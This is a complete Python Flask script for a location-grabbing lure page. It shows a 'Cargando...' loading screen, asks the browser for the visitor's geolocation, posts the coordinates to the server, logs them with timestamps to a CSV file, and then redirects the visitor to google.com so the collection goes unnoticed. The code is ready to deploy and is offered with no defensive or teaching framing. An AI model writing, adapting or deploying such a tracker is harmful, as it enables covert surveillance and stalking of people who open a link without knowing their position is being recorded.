from flask import Flask, request, render_template_string
import csv
from datetime import datetime
import os

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<body>
<h3>Cargando...</h3>

<script>
navigator.geolocation.getCurrentPosition(
  pos => {
    fetch("/location", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude
      })
    }).finally(() => window.location = "{{ url }}");
  },
  err => window.location = "{{ url }}"
);
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML, url="https://google.com")

@app.route("/location", methods=["POST"])
def location():
    data = request.json
    file_exists = os.path.isfile("locations.csv")

    with open("locations.csv", "a", newline="") as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(["timestamp", "lat", "lon"])
        writer.writerow([datetime.utcnow().isoformat(), data["lat"], data["lon"]])

    print(data)
    return "", 204

if __name__ == "__main__":
    app.run(debug=True)
